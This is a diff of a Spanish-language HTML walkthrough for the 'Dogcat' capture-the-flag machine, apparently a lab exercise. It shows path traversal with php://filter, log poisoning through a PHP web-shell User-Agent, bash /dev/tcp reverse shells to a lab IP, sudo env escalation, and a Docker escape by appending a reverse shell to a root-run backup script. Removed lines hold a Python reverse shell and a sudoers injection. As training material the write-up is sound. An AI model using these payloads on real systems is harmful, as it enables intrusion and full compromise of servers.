@@ -56,7 +56,7 @@
         
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="..//Dogcat/img/foto1.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <img src="..//Dogcat/img/foto1.png" alt="foto" class="writeup-image">
                     <p class="image-caption">Figura 1: Portal Web</p>
                 </div>
 
@@ -71,15 +71,17 @@
 
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="../Dogcat/img/foto2.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <img src="../Dogcat/img/foto2.png" alt="foto" class="writeup-image">
                     <p class="image-caption">Figura 2: Añadiendo ../ después de dog</p>
                 </div>
 
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="../Dogcat/img/foto3.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <img src="../Dogcat/img/foto3.png" alt="foto" class="writeup-image">
                     <p class="image-caption">Figura 3: Respuesta en la que podemos ver una posible exfiltración de datos</p>
                 </div>
+
+                <h3>Exfiltrar datos a través de un wrapper PHP</h3>
 
                 <div class="discovery-box-standard">
                     <h4></h4>
@@ -100,7 +102,7 @@
 
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="../Dogcat/img/foto4.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <img src="../Dogcat/img/foto4.png" alt="foto" class="writeup-image">
                     <p class="image-caption">Figura 4: Uso del wrapper php://filter</p>
                 </div>
 
@@ -120,26 +122,120 @@
             <h2><i class="fas fa-bug"></i>Explotación</h2>
             
             <div class="exploit-step">
-                <h3>Reverse Shell</h3>
+                <h3>Trabajar con el parámetro &ext=</h3>
 
                 <div class="discovery-box-standard">
                     <h4></h4>
-                    <p>Intentaremos establecer una revershell creandola con https://www.revshells.com/</p>
+                    <p>El parámetro &ext= evita que se añada automáticamente “.php” al archivo que se quiere incluir. Sin él, al usar un wrapper (como php://filter), se agregaría “.php” y fallaría la inclusión. Con &ext= puedes dejar la extensión vacía y que el wrapper funcione correctamente.
+                    </p>
                 </div>
                 
                 <div class="command-box">
                     <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.107",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' </code>
+                    <code>/?view=php://filter/convert.base64-encode/resource=dog/../../../../../etc/passwd&ext=</code>
                 </div>
                 
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="../U.A.HighSchool/img/foto7.png" alt="Panel de administración Tentacle" class="writeup-image">
-                    <p class="image-caption">Figura 7: modificación URL para insertar una Reverse Shell</p>
+                    <img src="../Dogcat/img/foto5.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 5: Uso del parámetro ext=</p>
                 </div>
                 
                 <div class="discovery-box warning">
-                    <h4><i class="fas fa-exclamation-triangle"></i> Antes de ejecutarlo debemos abrir un servidor a la escucha con netcat</h4>
+                    <h4><i class="fas fa-exclamation-triangle"></i>Ahora decodificamos este texto que está en base 64: https://www.base64decode.org/ </h4>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dogcat/img/foto6.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 6: Lista de usuarios del sistema</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Ahora probaremos a analizar el log del sistema </p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>/?view=dog/../../../../../var/log/apache2/access.log&ext=</code>
+                </div>
+                
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dogcat/img/foto7.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 7: Log del sistema</p>
+                </div>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>Lo importante aquí es que podemos visualizar los logs del sistema, lo que hace a la máquina susceptible de un log poisoning.
+                    </h4>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Inyectamos código PHP en el user agent para modificar el index y añadir un parámetro que, al incluirse, permite ejecutar código en el servidor.
+                    </p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>User-Agent: &lt;?php system($_GET['cmd']);?&gt;</code>
+                </div>
+
+                
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dogcat/img/foto8.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 8: Uso del parámetro User-Agent</p>
+                </div>
+
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Si le pasamos el parámetro cmd por URL: (Para ver el ID del usuario veremos que devuelve www-data)</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>/?view=dog/../../../../../var/log/apache2/access.log&ext=&cmd=id</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dogcat/img/foto9.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 9: Comprobación del log para ver el ID del usuario (www-data)</p>
+                </div>
+
+                <h3>Reverse Shell</h3>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Usaremos una sentencia típica de bash (Revisar IP de nuestro Kali)</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>bash -c 'bash -i >& /dev/tcp/10.23.73.4/4444 0>&1'</code>
+                </div>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>Lo codificamos en formato URL: https://www.urlencoder.org/</h4>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.23.73.4%2F4444%200%3E%261%27</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Dogcat/img/foto10.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 10: Insertamos la sentencia de la Shell reversa en la petición de BurpSuite</p>
+                </div>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>Antes de mandar la petición abrimos un servidor con netcat</h4>
                 </div>
 
                 <div class="command-box">
@@ -147,204 +243,35 @@
                     <code>nc -lvnp 4444</code>
                 </div>
 
-                <!-- Imagen -->
-                <div class="image-box">
-                    <img src="../U.A.HighSchool/img/foto8.png" alt="Panel de administración Tentacle" class="writeup-image">
-                    <p class="image-caption">Figura 8: Conexión de la Reverse Shell</p>
-                </div>
-
                 <div class="discovery-box-standard">
                     <h4></h4>
-                    <p>Con la conexión establecida debemos dirigirnos a /var/www/Hidden_Content y allí encontraremos un archivo llamado passphrase.txt</p>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>cd /var/www/Hidden_Content</code>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>cat passphrase.txt</code>
-                </div>
-                
-                <!-- Imagen -->
-                <div class="image-box">
-                    <img src="../U.A.HighSchool/img/foto9.png" alt="Panel de administración Tentacle" class="writeup-image">
-                    <p class="image-caption">Figura 9: Acceso a la ruta: /var/www/Hidden_Content</p>
-                </div>
-
-                <div class="discovery-box-standard">
-                    <h4></h4>
-                    <p>Obtendremos una cadena en Base64, por lo tanto debemos decodificarla, para ello usaremos la terminal con el siguiente comando:</p>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>echo "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d</code>
-                </div>
-
-                <div class="discovery-box-standard">
-                    <h4>Resultado:</h4>
-                    <p>AllmightForEver!!!</p>
-                </div>
-
-                <div class="discovery-box-standard">
-                    <h4></h4>
-                    <p>Ahora nos dirigimos a esta ruta: /var/www/html/assets/images <br> (En esta ruta veremos dos imágenes)</p>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>cd /var/www/html/assets/images</code>
+                    <p>Si enviamos la petición de la Reverse Shell (Burp Suite) veremos que obtenemos acceso</p>
                 </div>
 
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="../U.A.HighSchool/img/foto10.png" alt="Panel de administración Tentacle" class="writeup-image">
-                    <p class="image-caption">Figura 10: Acceso a la ruta: /var/www/html/assets/images</p>
-                </div>
-
-                <div class="discovery-box-standard">
-                    <h4></h4>
-                    <p>Exportamos las imágenes con el comando wget</p>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>wget http://10.10.204.93/assets/images/oneforall.jpg  </code>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>wget http://10.10.204.93/assets/images/yuei.jpg  </code>
+                    <img src="../Dogcat/img/foto11.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 11: Conexión establecida</p>
                 </div>
 
                 <div class="discovery-box warning">
-                    <h4><i class="fas fa-exclamation-triangle"></i>La única que nos interesa realmente es oneforall.jpg</h4>
+                    <h4><i class="fas fa-exclamation-triangle"></i>Como la máquina no tiene python para estabilizar un poco la shell ejecutamos:</h4>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>script /dev/null -c bash</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>export TERM=xterm</code>
                 </div>
 
                 <!-- Imagen -->
                 <div class="image-box">
-                    <img src="../U.A.HighSchool/img/foto11.png" alt="Panel de administración Tentacle" class="writeup-image">
-                    <p class="image-caption">Figura 11: Descargamos la imágen oneforall.jpg</p>
-                </div>
-
-                <div class="discovery-box-standard">
-                    <h4></h4>
-                    <p>La foto oneforall.jpg está corrupta, así que debermos arreglarla usando la herramienta MagicBytes:</p>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>https://github.com/Haxrein/MagicBytes</code>
-                </div>
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>git clone https://github.com/Haxrein/MagicBytes.git</code>
-                </div>
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>cd /MagicBytes</code>
-                </div>
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>python3 magicbytes.py -i oneforall.jpg -m jpg</code>
-                </div>
-
-                <!-- Imagen -->
-                <div class="image-box">
-                    <img src="../U.A.HighSchool/img/foto12.png" alt="Panel de administración Tentacle" class="writeup-image">
-                    <p class="image-caption">Figura 12: Utiización de MagicBytes</p>
-                </div>
-
-                <div class="discovery-box-standard">
-                    <h4></h4>
-                    <p>Veremos que la imagen oneforall.jpg ahora es accesible</p>
-                </div>
-
-                <!-- Imagen -->
-                <div class="image-box">
-                    <img src="../U.A.HighSchool/img/foto13.png" alt="Panel de administración Tentacle" class="writeup-image">
-                    <p class="image-caption">Figura 13: oneforall.jpg</p>
-                </div>
-
-                <div class="discovery-box-standard">
-                    <h4></h4>
-                    <p>Ahora podemos usar Steghide y encontrar una pista secreta en la imágen oneforall.jpg:
-                    </p>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>sudo apt update</code>
-                </div>
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>sudo apt install steghide</code>
-                </div>
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>steghide extract -sf oneforall.jpg</code>
-                </div>
-                <div class="discovery-box warning">
-                    <h4><i class="fas fa-exclamation-triangle"></i>Nos pedirá una contraseña: AllmightForEver!!!
-                    </h4>
-                </div>
-
-                <div class="discovery-box-standard">
-                    <h4>Resultado:</h4>
-                    <p>steghide extract -sf oneforall.jpg<br>    
-                        Enter passphrase:<br>  
-                        wrote extracted data to "creds.txt".
-                    </p>
-                </div>
-
-                <div class="discovery-box-standard">
-                    <h4></h4>
-                    <p>Esto nos exporta un fichero creds.txt, el cual podremos visualizar sin problemas, este fichero contiene las credenciales de acceso SSH</p>
-                </div>
-
-                <!-- Imagen -->
-                <div class="image-box">
-                    <img src="../U.A.HighSchool/img/foto14.png" alt="Panel de administración Tentacle" class="writeup-image">
-                    <p class="image-caption">Figura 14: creds.txt</p>
-                </div>
-
-                <h3>Acceso SSH</h3>
-
-                <div class="discovery-box-standard">
-                    <h4></h4>
-                    <p>Con las credenciales obtenidas anteriormente, procedemos a establecer una conexión SSH con la máquina objetivo</p>
-                </div>
-                
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>ssh deku@10.10.204.93</code>
-                </div>
-
-                <!-- Imagen -->
-                <div class="image-box">
-                    <img src="../U.A.HighSchool/img/foto15.png" alt="Panel de administración Tentacle" class="writeup-image">
-                    <p class="image-caption">Figura 15: Acceso por SSH</p>
-                </div>
-
-                <h3>User Flag</h3>
-
-                <div class="discovery-box-standard">
-                    <h4></h4>
-                    <p>Una vez establecida la conexión SSH podremos ver la user flag (user.txt)</p>
-                </div>
-
-                <div class="command-box">
-                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                    <code>cat user.txt</code>
-                </div>
-
-                <!-- Imagen -->
-                <div class="image-box">
-                    <img src="../U.A.HighSchool/img/foto16.png" alt="Panel de administración Tentacle" class="writeup-image">
-                    <p class="image-caption">Figura 16: User Flag (user.txt)</p>
+                    <img src="../Dogcat/img/foto12.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 12: Reverse Shell estabilizada</p>
                 </div>
 
             </div>
@@ -356,87 +283,31 @@
 
             <div class="discovery-box-standard">
                 <h4></h4>
-                <p>Ejecutamos sudo -l y nos desplazamos al archivo feedback.sh en /opt ya que es donde tenemos privilegios</p>
+                <p>Si recordamos en el sistema no hay usuarios creados.<br><br>
+                    Por ello debemos istar sólo los usuarios con UID ≥ 1000 (usuarios reales, no del sistema)
+                    </p>
             </div>
 
             <div class="command-box">
                 <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>sudo -l</code>
+                <code>awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd</code>
             </div>
 
             <!-- Imagen -->
             <div class="image-box">
-                <img src="../U.A.HighSchool/img/foto17.png" alt="Panel de administración Tentacle" class="writeup-image">
-                <p class="image-caption">Figura 17: Privilegios sobre feedback.sh</p>
-            </div>
-
-            <div class="command-box">
-                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>cat /opt/NewComponent/feedback.sh</code>
-            </div>
-
-            <!-- Imagen -->
-            <div class="image-box">
-                <img src="../U.A.HighSchool/img/foto18.png" alt="Panel de administración Tentacle" class="writeup-image">
-                <p class="image-caption">Figura 18: Contenido de feedback.sh</p>
-            </div>
-
-            <h3>Desglose de feedback.sh</h3>
-
-            <div class="discovery-box">
-                <h4>Características detectadas:</h4>
-                <ul>
-                    <li>Muestra un mensaje de bienvenida.</li><br>
-                    <li>Pide al usuario que escriba un feedback.</li><br>
-                    <li>Revisa si el input contiene símbolos peligrosos como: <code>`, ), $(, |, &, ;, ?, !, \</code></li><br>
-                    <li>
-                        Si no tiene esos símbolos:
-                        <ul>
-                            <li>Lo imprime usando eval (¡peligroso!).</li>
-                            <li>Lo guarda en <code>/var/log/feedback.txt</code>.</li>
-                            <li>Muestra "Feedback successfully saved."</li><br>
-                        </ul>
-                    </li>
-                    <li>
-                        Si sí tiene símbolos peligrosos:
-                        <ul>
-                            <li>Muestra "Invalid input."</li>
-                        </ul>
-                    </li>
-                </ul>
+                <img src="../Dogcat/img/foto13.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 13: Listado de usuarios reales, no del sistema</p>
             </div>
 
             <div class="discovery-box warning">
-                <h4><i class="fas fa-exclamation-triangle"></i>Nos centraremos en la sección "Eval", aquí es donde podemos hacer la actualización de autorización.
-                </h4>
+                <h4><i class="fas fa-exclamation-triangle"></i>Sale vacío, aí que probaremos directamente a intentar escalar privilegios a root</h4>
             </div>
 
             <div class="discovery-box-standard">
                 <h4></h4>
-                <p>Usaremos este código para el feedback y así poder modificar el fichero /etc/sudoers: </p>
+                <p>Llegados a este punto, intentaremos ver que comandos puede ejecutar el usuario con privilegios de administrador</p>
             </div>
-
-            <div class="command-box">
-                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>sudo /opt/NewComponent/feedback.sh</code>
-            </div>
-
-            <div class="command-box">
-                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>deku ALL=NOPASSWD: ALL >> /etc/sudoers</code>
-            </div>
-
-            <!-- Imagen -->
-            <div class="image-box">
-                <img src="../U.A.HighSchool/img/foto19.png" alt="Panel de administración Tentacle" class="writeup-image">
-                <p class="image-caption">Figura 19: Explotación de feedback.sh</p>
-            </div>
-
-            <div class="discovery-box-standard">
-                <h4></h4>
-                <p>Si probamos sudo -l con el usuario deku veremos que ahora si pertenecemos al grupo de root</p>
-            </div>
-
+            
             <div class="command-box">
                 <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
                 <code>sudo -l</code>
@@ -444,42 +315,172 @@
 
             <!-- Imagen -->
             <div class="image-box">
-                <img src="../U.A.HighSchool/img/foto20.png" alt="Panel de administración Tentacle" class="writeup-image">
-                <p class="image-caption">Figura 20: El usuario deku quedará establecido como root</p>
+                <img src="../Dogcat/img/foto14.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 14: Resultado de sudo -l</p>
             </div>
-
-            <div class="command-box">
-                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>sudo su</code>
-            </div>
-
-            <!-- Imagen -->
-            <div class="image-box">
-                <img src="../U.A.HighSchool/img/foto21.png" alt="Panel de administración Tentacle" class="writeup-image">
-                <p class="image-caption">Figura 21: El usuario deku podrá elevar sus privilegios a root</p>
-            </div>
-
-            <h3>Root Flag</h3>
 
             <div class="discovery-box-standard">
                 <h4></h4>
-                <p>Una vez establecidos como root veremos que podremos acceder a la root flag (root.txt)</p>
+                <p>Veremos que tenemos privilegios sobre /usr/bin/env</p>
+            </div>
+
+            <h3>Utilidad  env</h3>
+
+            <div class="discovery-box">
+                <h4>env es una utilidad estándar en Unix que:</h4>
+                <ul class="findings-list">
+                    <li>Ejecuta un programa en un entorno modificado.</li>
+                    <li>Se suele usar para lanzar scripts con el intérprete correcto.</li>
+                </ul>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>En este caso la escalada es bastante sencilla ya que podemos ejecutar el comando env con el parámetro bash y obtener un shell.
+                </p>
             </div>
 
             <div class="command-box">
                 <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>cd /root</code>
-            </div>
-
-            <div class="command-box">
-                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
-                <code>cat root.txt</code>
+                <code>sudo /usr/bin/env /bin/bash</code>
             </div>
 
             <!-- Imagen -->
             <div class="image-box">
-                <img src="../U.A.HighSchool/img/foto22.png" alt="Panel de administración Tentacle" class="writeup-image">
-                <p class="image-caption">Figura 22: Root Flag (root.txt)</p>
+                <img src="../Dogcat/img/foto15.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 15: uso de sudo /usr/bin/env /bin/bash</p>
+            </div>
+
+            <h3>Flag (1 - 4)</h3>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Las tres primeras flags las tenemos aquí:</p>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="..//Dogcat/img/foto16.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 16: Flag (1 - 4)</p>
+            </div>
+
+            <h3>Flag (2 - 4)</h3>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="..//Dogcat/img/foto17.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 17: Flag (2 - 4)</p>
+            </div>
+
+            <h3>Flag (3 - 4)</h3>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="..//Dogcat/img/foto18.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 18: Flag (3 - 4)</p>
+            </div>
+
+            <h3>Flag (4 - 4)</h3>
+
+            <div class="discovery-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i>La última flag es algo “compleja”</h4>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Si nos fijamos (además de que lo dice en el reto) el id del host donde somos root es un string id similar a 
+                los que genera Docker. Por lo que estamos en un entorno de Docker</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Para escapar podemos navegar a /opt/backups.
+                </p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>cd /opt/backups</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="..//Dogcat/img/foto19.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 19: Navegamos a /opt/backups</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Encontramos un script que hace un backup completo del contenedor por lo que debe estar siendo ejecutado por el usuario root</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Debemos modificar el script de backup (Revisar IP de nuestro Kali)</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>echo 'bash -i >& /dev/tcp/10.23.73.4/9999 0>&1' >> backup.sh</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="..//Dogcat/img/foto20.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 20: insertamos la llamada a la Reverse Shell</p>
+            </div>
+
+            <div class="discovery-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i>Antes de ejecutar eso debemos abrirnos un servidor a la escucha con netcat</h4>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>nc -lvnp 9999</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="..//Dogcat/img/foto21.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 21: Servidor a la escucha en el puerto 9999</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Si ejecutamos el script, podremos ver que aunque ponga que la conexión ha sido rechazada se conectará exitosamente</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>./backup.sh</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="..//Dogcat/img/foto22.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 22: Ejecución del script backup.sh</p>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="..//Dogcat/img/foto23.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 23: Conexión establecida en el puerto 9999</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Listamos los archivos y veremos que efectivamante está a nuestro alcance la flag 4</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>ls</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="..//Dogcat/img/foto24.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 24: Flag (4 - 4)</p>
             </div>
 
         </section>
